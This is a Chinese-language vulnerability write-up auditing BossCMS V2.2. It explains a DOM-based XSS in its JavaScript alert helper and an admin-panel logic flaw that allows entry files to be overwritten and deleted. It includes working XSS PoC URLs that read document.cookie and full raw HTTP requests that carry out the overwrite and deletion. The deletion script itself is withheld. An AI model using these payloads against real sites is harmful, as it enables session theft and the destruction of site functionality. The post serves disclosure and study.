### 前言

大家好我是 A2Cai，这次我审的是 BossCms V2.2 的源码

如果有错误，请大家多多包涵哦！

PS：这次本来想当 0day 发出来的，但是这边担心厂商投诉，所以只能等厂商修补了之后再发...

.

![](./img/91412726740186660.png)

.

![](./img/2244714743349864146.png)

.

### 源码

地址：<https://www.bosscms.net/download/>

BossCms V2.2

.

### global.js 缺陷导致的 DOM 型 XSS

这个漏洞我是在前台的 feedback 功能点找到的

在我成功提交反馈的时候会弹出个提示，告诉我提交成功

它是一个这样的 url 链接

    
    
    http://bosscms.test.com/feedback/#_alert=%E5%8F%8D%E9%A6%88%E6%8F%90%E4%BA%A4%E6%88%90%E5%8A%9F%EF%BC%81,green

我看到说既然可控又会渲染到前端，那就尝试下 XSS 吧

然后使用以下 Poc 成功弹窗

    
    
    http://bosscms.test.com/feedback/#_alert="><img src=# onerror=alert(document.cookie)>,green

.

![](./img/379612618997703688.png)

.

我就开始翻代码找漏洞点

一开始还以为是某个传参的过滤不严谨

发现 /system/basic/func/global.func.php 存在个有缺陷的 alert 函数

    
    
    function alert($str, $type=null, $color=null){
        global $G;
        if(arrExist($G,'get|jsonmsg')){
            $js = json::encode(array('state'=>$type?$type:'success','msg'=>$str));
        }else{
            if($type=='close'){
                $js .= "<script>alert('{$str}');window.close();</script>";
            }else if($type=='reload'){
                $js .= "<script>alert('{$str}');parent.location.reload();</script>";
            }else if($type==null){
                location($_SERVER['HTTP_REFERER'].'#_alert='.urlencode($str).','.($color?$color:'red'));
            }else{
                location($type.'#_alert='.urlencode($str).','.($color?$color:'green'));
            }
        }
        die($js);
    }
    

可以发现，如果在调用这个函数之前没做任何的特殊字符 HTML 字符实体化的话

那只要第一个参数可控，就一定会导致一个 XSS 漏洞的产生了

但后面在测的时候猛然发现，不对啊？我没传参啊？！

然后我搜全局，才发现端倪

多说无益，先看看下面这段 JavaScript 代码

    
    
    var at = window.location.hash.match(/#_alert=(.+?),(red|green|blue|yellow|gold)/);
    
    if(at){
        _alert(decodeURI(at[1]),at[2]);
        window.location.hash = window.location.hash.replace(at[0],'');
    }
    
    function _alert(str, type){
        var date = new Date();
        now = date.getTime();
        $('body').append('<h6 class="alert '+type+'" time="'+now+'" style="z-index:'+now+';"><b>'+str+'</b></h6>');
        tha = $('h6.alert[time="'+now+'"]');
        tha.animate({top:78,opacity:1},288);
        (function(tha){
            window.setTimeout(function(){
                tha.remove();
            },
            tha.hasClass('green')?3000:2000);
        })(tha);
    }
    

大体上就是说，它会截取我 URL 中 # 后面的字符

匹配正则之后直接拼接 HTML 然后添加到 body 标签下了

也就是说，只要加载了存在上述代码的 Js 文件

那最终就会导致一个 Dom 型 XSS 的产生

目前发现的两个地方都可以触发 XSS

    
    
    1. /feedback/#_alert="><img src=# onerror=alert(document.cookie)>,green
    2. /admin/#_alert="><img src=# onerror=alert(document.cookie)>,green

而存在问题的 js 文件暂时发现了这两个：global.js 和 bosscms.js

.

### 后台安全设置模块存在逻辑缺陷

漏洞点主要出现在 /system/admin/safe/safe.class.php 文件

核心在于以下两段代码：

    
    
    public function init()
    {
        global $G;
        $G['cover'] = $this->cover();
        if(preg_match("/^\w+$/", $old=arrExist($G['get'],'old_folder'))){
            if(is_file(ROOT_PATH.$old.'/index.php')){
                $str = file_get_contents(ROOT_PATH.$old.'/index.php');
                $res = dir::read(ROOT_PATH.$old.'/');
                if(strstr($str,"define('IS_INSIDE',true);") && count($res['file'])==1){
                    dir::remove(ROOT_PATH.$old.'/');
                }
            }
        }
        echo $this->theme('safe/safe');
    }
    
    public function add()
    {
    global $G;
    $this->cover('safe','M');
    if(isset($G['post'])){
        if(!$G['post']['admin_folder']){
            alert('后台文件夹不能为空！');
        }
        $BOSSCMS;
        $data = array(
            'page_cache_time'    => $G['post']['page_cache_time'],
            'upload_rename'      => $G['post']['upload_rename'],
            'upload_maxsize'     => $G['post']['upload_maxsize'],
            'upload_extension'   => preg_replace('/\\\"(\w)/','\".$1',$G['post']['upload_extension']),
            'upload_web_allow'   => $G['post']['upload_web_allow'],
            'upload_repeat'      => $G['post']['upload_repeat'],
            'ueditor_catchimage' => $G['post']['ueditor_catchimage']
        );
        foreach($data as $k=>$v){
            mysql::select_set(array('name'=>$k,'value'=>$v,'parent'=>'0','type'=>'0','lang'=>'0'),'config',array('value'));
        }
    
        $data = array(
            'admin_login_captcha' => $G['post']['admin_login_captcha'],
            'admin_logout_time'   => $G['post']['admin_logout_time'],
            'admin_login_errnum'  => $G['post']['admin_login_errnum'],
            'admin_login_errtime' => $G['post']['admin_login_errtime'],
            'window_full'         => $G['post']['window_full']
        );
        foreach($data as $k=>$v){
            mysql::select_set(array('name'=>$k,'value'=>$v,'parent'=>'0','type'=>'1','lang'=>'0'),'config',array('value'));
        }
    
        if($G['path']['folder'] != $G['post']['admin_folder']){
            if(!preg_match("/^\w+$/", $G['post']['admin_folder'])){
                alert('文件夹名称必须为英文、数字、下划线等字符');
            }
            dir::copydir(ROOT_PATH.$G['path']['folder'].'/', ROOT_PATH.$G['post']['admin_folder'].'/');
            alert('操作成功', '../'.$G['post']['admin_folder'].'/'.url::mpf('safe','safe','init',array('admin_folder'=>$G['post']['admin_folder'],'old_folder'=>$G['path']['folder'])));
        }else{
            alert('操作成功', url::mpf('safe','safe','init'));
        }
    }
    }
    

这个功能点是用于更改后台路径的地址的

默认的后台路径是 admin，也就是配置文件中 `$G['path']['folder']` 的值

我们可以通过传入 admin_folder 调用 add 方法来将 admin 改为 POST 进来的 admin_folder 的值

这里最大的问题就是它把完整的操作流程拆成两个部分

而完成第一部分后的第二部分它是选择使用重定向的方式去调用

先来大概说下它的具体流程：

  1. 调用 add 方法 拿 POST 传入的 admin_folder (新后台路径) 去当做参数调用 copydir 方法。
  2. copydir 方法会以 admin_folder 为名创建一个新的后台目录，然后将旧后台目录的所有文件复制过去。
  3. 最后通过重定向去调用 init 方法，将旧的后台目录删除。

梳理完完整的流程之后我们会发现，我们实际上是可以单独调用 add 方法和 init 方法去实现一些东西的

.

#### 文件覆盖

以 feedback 为例

我们可以调用 add 方法将传入的 admin_folder 的值改为 feedback (BossCMS 中负责意见反馈的文件的目录)

这样它会让旧的 index.php 把 feedback/index.php 的内容给覆盖掉

.

![](./img/4966893614748638783.png)

.

将 feedback 当做 admin_folder 的值然后调用 add 方法

    
    
    POST /admin/?mold=safe&part=safe&func=add HTTP/1.1
    Host: bosscms.test.com
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: multipart/form-data; boundary=---------------------------4172384995493174183638070831
    Content-Length: 1872
    Origin: http://bosscms.test.com
    Connection: close
    Referer: http://bosscms.test.com/admin/?mold=safe&part=safe&func=init
    Cookie: iframeScroll=; iframeMainTab=; bosscms4e1427ce3574583f353588d8a3dfb0c6=kd55i3f11352vk1cs5ou9d1p06; viewScrollY=; viewKindTag=core; viewScreen=pc
    Upgrade-Insecure-Requests: 1
    
    -----------------------------4172384995493174183638070831
    Content-Disposition: form-data; name="admin_folder"
    
    feedback
    -----------------------------4172384995493174183638070831
    Content-Disposition: form-data; name="admin_login_captcha"
    
    0
    -----------------------------4172384995493174183638070831
    Content-Disposition: form-data; name="admin_captcha_type"
    
    0
    -----------------------------4172384995493174183638070831
    Content-Disposition: form-data; name="admin_logout_time"
    
    28888
    -----------------------------4172384995493174183638070831
    Content-Disposition: form-data; name="admin_login_errnum"
    
    6
    -----------------------------4172384995493174183638070831
    Content-Disposition: form-data; name="admin_login_errtime"
    
    3600
    -----------------------------4172384995493174183638070831
    Content-Disposition: form-data; name="window_full"
    
    0
    -----------------------------4172384995493174183638070831
    Content-Disposition: form-data; name="upload_rename"
    
    1
    -----------------------------4172384995493174183638070831
    Content-Disposition: form-data; name="upload_maxsize"
    
    2
    -----------------------------4172384995493174183638070831
    Content-Disposition: form-data; name="upload_extension"
    
    [".jpg",".png",".jpeg",".gif",".mp4",".mp3",".pdf",".doc",".xls",".xlsx",".bmp",".csv",".ico",".JPG",".phtml"]
    -----------------------------4172384995493174183638070831
    Content-Disposition: form-data; name="upload_web_allow"
    
    0
    -----------------------------4172384995493174183638070831
    Content-Disposition: form-data; name="upload_repeat"
    
    0
    -----------------------------4172384995493174183638070831
    Content-Disposition: form-data; name="page_cache_time"
    
    0
    -----------------------------4172384995493174183638070831
    Content-Disposition: form-data; name="ueditor_catchimage"
    
    0
    -----------------------------4172384995493174183638070831--    

然后就变成如下图所示的内容

.

![](./img/2288464589343133908.png)

.

这个时候如果去访问 feedback 就会显示后台的页面（没登录就是后台登陆页面）

#### 文件删除

这个文件删除的条件是比较严格的，但结合上面这个文件覆盖可以起到稍稍好一点的效果

此处是调用 init 方法对特定目录下的文件进行删除，具体要满足以下几个条件

  1. 该目录必须为后台路径，且存在 `define('IS_INSIDE',true);` 字段。
  2. 该目录的名称必须为数字大小写字母下划线。
  3. 该路径下必须只有一个文件，且名称必须为 index.php。

这个如果没有前面的文件覆盖的话，将几乎无法利用

但如果能结合覆盖来用，就可以实现删除前台的所有入口文件和管理员的登录后台文件

#### 感染 & 删除

感染是指将 admin/index.php 的内容覆盖任何 xxx/index.php 文件

此时，如果你尝试访问 xxx，你会发现它变成了一个后台页面

例如：我们要感染 feedback 的这个业务

用上面那个数据包对 feedback 下的 index.php 进行覆盖

.

![](./img/2794318389980324118.png)

.

尝试访问：bosscms.test.com/feedback/

.

![](./img/1145323184573712602.png)

.

发现变成了后台，此时则满足上述提到的删除文件的三个条件

调用 init 函数去删除改文件

    
    
    GET /feedback/?mold=safe&part=safe&func=init&admin_folder=feedback&old_folder=admin HTTP/1.1
    Host: bosscms.test.com
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Referer: http://bosscms.test.com/admin/?mold=safe&part=safe&func=init
    Connection: close
    Cookie: iframeScroll=576%7E%7E%7E%3Fmold%3Dsafe%26part%3Dsafe%26func%3Dinit; iframeMainTab=; viewScrollY=; viewKindTag=core; viewScreen=pc; bosscms4e1427ce3574583f353588d8a3dfb0c6=ab9eksbfht4da09kmm98vqdhh4
    Upgrade-Insecure-Requests: 1
    

feedback 下的 index.php 文件被删除了

.

![](./img/1717782645334555761.png)

.

所以基本上只要符合文件删除的特征的目录，都可以将里面的 index.php 文件给删除

借此，我写了个脚本，可以实现一键破坏前台＋后台的所有功能点，只需要你拥有后台权限

（PS：测试的时候做好备份）

#### Exp

    
    
    暂不提供
    

最后实现的效果就是网站所有功能点都 404

